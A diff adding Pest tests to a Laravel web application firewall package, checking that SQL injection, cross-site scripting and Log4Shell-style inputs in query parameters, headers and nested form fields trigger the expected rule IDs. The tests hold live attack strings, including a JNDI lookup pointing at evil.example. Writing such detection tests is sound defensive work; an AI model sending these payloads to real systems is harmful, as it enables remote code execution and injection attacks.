@@ -1,7 +1,9 @@
 <?php
 
+use Illuminate\Http\Request;
 use Illuminate\Http\UploadedFile;
 use Illuminate\Support\Facades\DB;
+use Tuijncode\LaravelWaf\Services\WafInspector;
 
 it('inspects the POST body', function () {
     $this->post('/', ['q' => "' OR 1=1 --"])->assertOk();
@@ -12,6 +14,12 @@ it('inspects the POST body', function () {
         ->and($log->category)->toBe('sqli')
         ->and($log->rule_ids)->toContain('942120')
         ->and($log->method)->toBe('POST');
+});
+
+it('inspects an overwritten duplicate query parameter', function () {
+    $this->get('/?q='.rawurlencode('<script>alert(1)</script>').'&q=safe')->assertOk();
+
+    expect(DB::table('waf_logs')->value('rule_ids'))->toContain('941100');
 });
 
 it('inspects a raw XML body for XXE', function () {
@@ -33,6 +41,20 @@ it('inspects request headers', function () {
 
     expect($log)->not->toBeNull()
         ->and($log->rule_ids)->toContain('944150');
+});
+
+it('inspects every client header and repeated value', function () {
+    $payload = '${jndi:ldap://evil.example/a}';
+
+    foreach (['Host', 'Accept-Language'] as $name) {
+        $request = Request::create('/', 'GET');
+        $request->headers->set($name, $payload);
+        expect(app(WafInspector::class)->inspect($request)->ruleIds())->toContain('944150');
+    }
+
+    $request = Request::create('/', 'GET');
+    $request->headers->set('X-Trace', ['safe-one', 'safe-two', $payload]);
+    expect(app(WafInspector::class)->inspect($request)->ruleIds())->toContain('944150');
 });
 
 it('inspects cookies', function () {
@@ -93,4 +115,15 @@ it('inspects the client names of uploaded files', function () {
 
     expect($log)->not->toBeNull()
         ->and($log->type)->toContain('Web Shell Signature');
+});
+
+it('inspects a text field sharing a parent with an uploaded file', function () {
+    $this->post('/', [
+        'post' => [
+            'file' => UploadedFile::fake()->create('document.txt', 1),
+            'title' => '<script>alert(1)</script>',
+        ],
+    ])->assertOk();
+
+    expect(DB::table('waf_logs')->value('rule_ids'))->toContain('941100');
 });
